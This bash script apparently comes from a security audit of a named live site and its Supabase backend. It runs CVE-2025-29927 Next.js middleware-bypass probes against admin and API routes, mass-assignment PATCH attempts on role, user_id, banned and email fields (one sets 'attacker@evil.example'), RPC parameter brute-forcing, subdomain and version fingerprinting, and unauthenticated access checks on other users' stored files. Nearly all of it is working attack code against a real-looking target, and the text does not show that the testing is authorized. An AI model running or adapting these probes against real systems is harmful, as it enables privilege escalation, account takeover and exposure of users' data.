#!/bin/bash
# Misc hardening checks: CVE-2025-29927 middleware bypass, profile PATCH column reachability,
# RPC parameter enumeration, DNS/infra recon, Next.js fingerprint from chunks, TLS headers.
source "$(dirname "$0")/env.sh"

TOKEN2="$(cat /tmp/token2.txt 2>/dev/null)"
USER2="$(cat /tmp/user2.txt 2>/dev/null)"

echo "########## 1. CVE-2025-29927 (Next.js middleware bypass) probes ##########"
CVE_HDR="x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
for p in "/api/no-watermark/x" "/api/submit-photoshop-job" "/admin" "/api/supabase/rest/v1/profiles?select=user_id&limit=1"; do
  echo "--- $p with header"
  code=$(curl -sS -k -m 20 -A "$UA" -H "$CVE_HDR" -H "apikey: $KEY" -o /tmp/b.bin -w "%{http_code}" "$SITE$p")
  echo "HTTP $code : $(head -c 160 /tmp/b.bin | tr -d '\n')"
done

echo
echo "########## 2. profiles PATCH column reachability (own test row only) ##########"
U1="23c8fb62-49c5-42d9-b031-906b97cd1cb4"
for body in '{"user_id":"00000000-0000-4000-8000-000000000001"}' '{"generations_left":5}' '{"role":"user"}' '{"secret_key":"audit-secret"}' '{"auto_delete_days":7}' '{"email":"attacker@evil.example"}' '{"banned":true}'; do
  code=$(curl -sS -k -m 20 -A "$UA" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "Prefer: return=representation" \
    -X PATCH -d "$body" -o /tmp/b.bin -w "%{http_code}" "$SUPA/rest/v1/profiles?user_id=eq.$U1")
  echo "PATCH $body -> HTTP $code : $(head -c 220 /tmp/b.bin | tr -d '\n')"
done
echo "--- restore benign values / read final state)"
curl -sS -k -m 20 -A "$UA" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" \
  -X PATCH -H "Content-Type: application/json" -d '{"banned":false,"auto_delete_days":0,"email":"test2@x.com"}' \
  -o /dev/null -w 'restore HTTP %{http_code}\n' "$SUPA/rest/v1/profiles?user_id=eq.$U1"
req GET "$SUPA/rest/v1/profiles?select=user_id,role,generations_left,email,secret_key,banned,auto_delete_days&user_id=eq.$U1" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"

echo
echo "########## 3. user2 PATCH user_id (can PK be moved to orphan the auto-created row?) ##########"
req PATCH "$SUPA/rest/v1/profiles?user_id=eq.$USER2" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2" -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d '{"user_id":"00000000-0000-4000-8000-000000000002"}'
req GET "$SUPA/rest/v1/profiles?select=user_id,role&user_id=eq.$USER2" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2"

echo
echo "########## 4. get_jobs_time_series parameter-name enumeration ##########"
for body in '{"p_days_back":7}' '{"days_back":7}' '{"num_days":7}' '{"count":7}' '{"p_count":7}' '{"range":7}' '{"p_range":"7 days"}' '{"p_limit":7}' '{"hours":24}' '{"p_hours":24}' '{"start_date":"2026-11-01"}' '{"p_start_date":"2026-11-01","p_end_date":"2026-11-10"}'; do
  code=$(curl -sS -k -m 15 -A "$UA" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -X POST -d "$body" -o /tmp/b.bin -w "%{http_code}" "$SUPA/rest/v1/rpc/get_jobs_time_series")
  echo "  $body -> $code : $(head -c 180 /tmp/b.bin | tr -d '\n')"
done

echo
echo "########## 5. /api/no-watermark with anon/publishable tokens ##########"
for auth in "Bearer $KEY" "Basic $KEY" "" ; do
  code=$(curl -sS -k -m 20 -A "$UA" -H "Authorization: $auth" -o /tmp/b.bin -w "%{http_code}" "$SITE/api/no-watermark/1778112266686")
  echo "Authorization='${auth:0:24}...' -> HTTP $code : $(head -c 120 /tmp/b.bin | tr -d '\n')"
done

echo
echo "########## 6. Next.js version strings in downloaded chunks ##########"
ls -la /tmp/next_*.js 2>/dev/null
grep -ohE '"[0-9]+\.[0-9]+\.[0-9]+(-[a-z0-9.]+)?"' /tmp/next_*.js 2>/dev/null | sort -u | head -25
echo "--- react/next identifiers ---"
grep -ohE 'react-dom[^"]{0,30}|react\.production[^"]{0,20}|next/dist[^"]{0,40}' /tmp/next_*.js 2>/dev/null | sort -u | head -10
grep -ohE 'version:"(19|18)\.[0-9]+\.[0-9]+"' /tmp/next_*.js 2>/dev/null | sort -u | head

echo
echo "########## 7. Fingerprint headers on multiple routes ##########"
for p in "/" "/en/login" "/en/generator" "/api/status/x"; do
  echo "--- $p"
  curl -sS -k -m 20 -A "$UA" -D - -o /dev/null "$SITE$p" | grep -iE "^(HTTP|server|x-powered-by|x-nextjs|x-matched-path|content-security-policy|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy|access-control|vary|set-cookie)" | sed 's/\r$//'
done

echo
echo "########## 8. Subdomain / infrastructure recon (crt.sh) ##########"
curl -sS -m 60 -A "$UA" "https://crt.sh/?q=%25.onlyfakeai.ru&output=json" -o /tmp/crt.json -w 'crt.sh HTTP %{http_code} bytes=%{size_download}\n' || true
python3 - <<'PY'
import json
try:
    d=json.load(open('/tmp/crt.json'))
except Exception as e:
    print('crt parse err:', e); raise SystemExit
names=set()
for row in d:
    for n in str(row.get('name_value','')).split('\n'):
        names.add(n.strip().lower())
names={n for n in names if n}
for n in sorted(names):
    print('  cert-name:', n)
PY

echo
echo "########## 9. HTTP security headers (baseline) ##########"
curl -sS -k -m 20 -A "$UA" -D - -o /dev/null "$SITE/" | sed 's/\r$//' | grep -iE "^(HTTP|content-security-policy|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy|cross-origin|access-control)" 

echo
echo "########## 10. Public storage read of OTHER user's files via CDN without apikey (HEAD only) ##########"
for name in "1778112266686_preview.png" "1778112756677_preview.png"; do
  echo "--- HEAD /storage/v1/object/public/photos/$name (no apikey, no auth)"
  curl -sS -k -m 20 -A "$UA" -I "$SUPA/storage/v1/object/public/photos/$name" | sed 's/\r$//' | grep -iE "^(HTTP|content-type|content-length|access-control|cf-|cache-control|etag)"
done
echo "--- HEAD /storage/v1/object/public/backgrounds/... (leftover audit probe file)"
curl -sS -k -m 20 -A "$UA" -I "$SUPA/storage/v1/object/public/backgrounds/vulnrat-audit-1794321400.txt" | sed 's/\r$//' | grep -iE "^(HTTP|content-type|content-length)"
